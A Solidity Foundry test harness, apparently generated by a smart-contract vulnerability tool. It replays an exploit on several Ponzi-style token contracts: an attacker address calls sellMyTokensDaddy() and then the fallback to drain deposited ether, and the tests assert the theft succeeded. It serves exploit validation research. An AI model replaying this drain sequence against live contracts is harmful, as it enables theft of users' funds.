// SPDX-License-Identifier: UNLICENSED
  
pragma experimental ABIEncoderV2;

import "../src/0x0f75.sol";
import "../src/0x1c98.sol";
import "../src/0x310b.sol";
import "../src/0x9460.sol";
import "../src/0xe923.sol";
import "../src/0xf3dc.sol";

interface Vm {
  function prank(address) external;
  function prank(address, address) external;
  function deal(address, uint256) external;
  function expectRevert(bytes calldata) external;
  function recordLogs() external;
  function getRecordedLogs() external returns (bytes32[] memory);
  function coinbase(address newCoinbase) external;
  function warp(uint256) external;
  function roll(uint256 newHeight) external;
  function expectEmit() external;
  function expectRevert() external;
}

// [INFO] original `this` address: (Elem ("0xfffffffFfffFfffffffFfFFFfFFFFEFeFffFffFf", T_address))

contract Counter {
  Vm vm = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
  uint constant initialBalance = 1000000000000000000000000;
  uint constant initialVictimBalance = 100000000000000000000;
    
  // target contract
  SMARTEST public smartest_1;
  
  address[] public untrusted;
  
  event smartest_check(bool safety_cond);
  event smartest_check2(uint attacker_balance, uint stolen_money);
  event TestResult(bool falsified, string message);
  event DebugUint(uint value);
  event DebugLog(string message);
  event DebugBytes32(bytes32 data);
  
  function beforeTestSetup(bytes4 testSelector) public pure 
  returns (bytes[] memory beforeTestCalldata) {
    if (testSelector == this.testScenario1.selector) {
      beforeTestCalldata = new bytes[](1);
      beforeTestCalldata[0] = abi.encodePacked(this.setScenario1.selector);
    } else if (testSelector == this.testScenario2.selector) {
      beforeTestCalldata = new bytes[](1);
      beforeTestCalldata[0] = abi.encodePacked(this.setScenario2.selector);
    } else if (testSelector == this.testScenario3.selector) {
      beforeTestCalldata = new bytes[](1);
      beforeTestCalldata[0] = abi.encodePacked(this.setScenario3.selector);
    } else if (testSelector == this.testScenario4.selector) {
      beforeTestCalldata = new bytes[](1);
      beforeTestCalldata[0] = abi.encodePacked(this.setScenario4.selector);
    } else if (testSelector == this.testScenario5.selector) {
      beforeTestCalldata = new bytes[](1);
      beforeTestCalldata[0] = abi.encodePacked(this.setScenario5.selector);
    } else if (testSelector == this.testScenario6.selector) {
      beforeTestCalldata = new bytes[](1);
      beforeTestCalldata[0] = abi.encodePacked(this.setScenario6.selector);
    } else if (testSelector == this.testFeilScenario1.selector) {
      beforeTestCalldata = new bytes[](1);
      beforeTestCalldata[0] = abi.encodePacked(this.setFeilScenario1.selector);
    }
  }
  
  function isContractDestroyed(address contractAddress) public returns (bool) {
    uint256 size;
    assembly {
      size := extcodesize(contractAddress)
    }
    emit DebugUint(size);
    return size == 0;
  }
    
  function isEtherLeaked() public returns (bool) {
    uint s = 0;
    for (uint i = 0; i < untrusted.length; i += 1) {
      require(s + untrusted[i].balance >= s, "isEtherLeaked : integer overflow");
      s += untrusted[i].balance;
    }
    emit DebugUint(s);
    return s > untrusted.length * initialBalance;
  }
    
  function setScenario1() public {
    vm.recordLogs();
    
    vm.deal(0x0000000000000000000000000000010100400000, initialBalance); untrusted.push(0x0000000000000000000000000000010100400000);
    vm.deal(0xFffFfffFffFFFFfFFfFFFFfFFfFFFeFeff83FFff, initialBalance);
    vm.deal(0xfffffffFfffFfffffffFfFFFfFFFFEFeFffFffFf, initialBalance);
        
    vm.prank(address(0xFffFfffFffFFFFfFFfFFFFfFFfFFFeFeff83FFff));
    smartest_1 = (new SMARTEST)();
    
    vm.deal(address(smartest_1), address(smartest_1).balance + initialVictimBalance);
    vm.prank(address(0x0000000000000000000000000000010100400000));
    smartest_1.sellMyTokensDaddy();
    
    vm.prank(address(0x0000000000000000000000000000010100400000));
    bool success_2 = address(smartest_1).call("");
    require(success_2, "validator: unexpected fallback revert");
  }
  
  function setScenario2() public {
    vm.recordLogs();
    
    vm.deal(0x0000000000000000000000000000010100400000, initialBalance); untrusted.push(0x0000000000000000000000000000010100400000);
    vm.deal(0xFffFfffFffFFFFfFFfFFFFfFFfFFFeFeff83FFff, initialBalance);
    vm.deal(0xfffffffFfffFfffffffFfFFFfFFFFEFeFffFffFf, initialBalance);
        
    vm.prank(address(0xFffFfffFffFFFFfFFfFFFFfFFfFFFeFeff83FFff));
    EthConnectPonzi smartest_1 = (new EthConnectPonzi)();
    
    vm.deal(address(smartest_1), address(smartest_1).balance + initialVictimBalance);
    vm.prank(address(0x0000000000000000000000000000010100400000));
    smartest_1.sellMyTokensDaddy();
    
    vm.prank(address(0x0000000000000000000000000000010100400000));
    bool success_2 = address(smartest_1).call("");
    require(success_2, "validator: unexpected fallback revert");
  }
  
  function setScenario3() public {
    vm.recordLogs();
    
    vm.deal(0x0000000000000000000000000000010100400000, initialBalance); untrusted.push(0x0000000000000000000000000000010100400000);
    vm.deal(0xFffFfffFffFFFFfFFfFFFFfFFfFFFeFeff83FFff, initialBalance);
    vm.deal(0xfffffffFfffFfffffffFfFFFfFFFFEFeFffFffFf, initialBalance);
        
    vm.prank(address(0xFffFfffFffFFFFfFFfFFFFfFFfFFFeFeff83FFff));
    NumbersToken smartest_1 = (new NumbersToken)();
    
    vm.deal(address(smartest_1), address(smartest_1).balance + initialVictimBalance);
    vm.prank(address(0x0000000000000000000000000000010100400000));
    smartest_1.sellMyTokensDaddy();
    
    vm.prank(address(0x0000000000000000000000000000010100400000));
    bool success_2 = address(smartest_1).call("");
    require(success_2, "validator: unexpected fallback revert");
  }
  
  function setScenario4() public {
    vm.recordLogs();
    
    vm.deal(0x0000000000000000000000000000010100400000, initialBalance); untrusted.push(0x0000000000000000000000000000010100400000);
    vm.deal(0xFffFfffFffFFFFfFFfFFFFfFFfFFFeFeff83FFff, initialBalance);
    vm.deal(0xfffffffFfffFfffffffFfFFFfFFFFEFeFffFffFf, initialBalance);
        
    vm.prank(address(0xFffFfffFffFFFFfFFfFFFFfFFfFFFeFeff83FFff));
    RfsCoin smartest_1 = (new RfsCoin)();
    
    vm.deal(address(smartest_1), address(smartest_1).balance + initialVictimBalance);
    vm.prank(address(0x0000000000000000000000000000010100400000));
    smartest_1.sellMyTokensDaddy();
    
    vm.prank(address(0x0000000000000000000000000000010100400000));
    bool success_2 = address(smartest_1).call("");
    require(success_2, "validator: unexpected fallback revert");
  }
  
  function setScenario5() public {
    vm.recordLogs();
    
    vm.deal(0x0000000000000000000000000000010100400000, initialBalance); untrusted.push(0x0000000000000000000000000000010100400000);
    vm.deal(0xFffFfffFffFFFFfFFfFFFFfFFfFFFeFeff83FFff, initialBalance);
    vm.deal(0xfffffffFfffFfffffffFfFFFfFFFFEFeFffFffFf, initialBalance);
        
    vm.prank(address(0xFffFfffFffFFFFfFFfFFFFfFFfFFFeFeff83FFff));
    PonziTokenV4 smartest_1 = (new PonziTokenV4)();
    
    vm.deal(address(smartest_1), address(smartest_1).balance + initialVictimBalance);
    vm.prank(address(0x0000000000000000000000000000010100400000));
    smartest_1.sellMyTokensDaddy();
    
    vm.prank(address(0x0000000000000000000000000000010100400000));
    bool success_2 = address(smartest_1).call("");
    require(success_2, "validator: unexpected fallback revert");
  }
  
  function setScenario6() public {
    vm.recordLogs();
    
    vm.deal(0x0000000000000000000000000000010100400000, initialBalance); untrusted.push(0x0000000000000000000000000000010100400000);
    vm.deal(0xFffFfffFffFFFFfFFfFFFFfFFfFFFeFeff83FFff, initialBalance);
    vm.deal(0xfffffffFfffFfffffffFfFFFfFFFFEFeFffFffFf, initialBalance);
        
    vm.prank(address(0xFffFfffFffFFFFfFFfFFFFfFFfFFFeFeff83FFff));
    NumbersToken2 smartest_1 = (new NumbersToken2)();
    
    vm.deal(address(smartest_1), address(smartest_1).balance + initialVictimBalance);
    vm.prank(address(0x0000000000000000000000000000010100400000));
    smartest_1.sellMyTokensDaddy();
    
    vm.prank(address(0x0000000000000000000000000000010100400000));
    bool success_2 = address(smartest_1).call("");
    require(success_2, "validator: unexpected fallback revert");
  }
  
  function setFeilScenario1() public {
    vm.recordLogs();
    
    vm.deal(0x0000000000000000000000000000010100400000, initialBalance); untrusted.push(0x0000000000000000000000000000010100400000);
    vm.deal(0xFffFfffFffFFFFfFFfFFFFfFFfFFFeFeff83FFff, initialBalance);
    vm.deal(0xfffffffFfffFfffffffFfFFFfFFFFEFeFffFffFf, initialBalance);
        
    vm.prank(address(0xFffFfffFffFFFFfFFfFFFFfFFfFFFeFeff83FFff));
    smartest_1 = (new SMARTEST)();
    
    vm.prank(address(0x0000000000000000000000000000010100400000));
    bool success_2 = address(smartest_1).call("");
    require(success_2, "validator: unexpected fallback revert");
  }

  function testScenario1() public {
    require(isEtherLeaked(), "failed to steal");
  }
  
  function testScenario2() public {
    require(isEtherLeaked(), "failed to steal");
  }
  
  function testScenario3() public {
    require(isEtherLeaked(), "failed to steal");
  }
  
  function testScenario4() public {
    require(isEtherLeaked(), "failed to steal");
  }
  
  function testScenario5() public {
    require(isEtherLeaked(), "failed to steal");
  }
  
  function testScenario6() public {
    require(isEtherLeaked(), "failed to steal");
  }
  
  function testFeilScenario1() public {
    require(!isEtherLeaked(), "succeed to steal");
  }
}

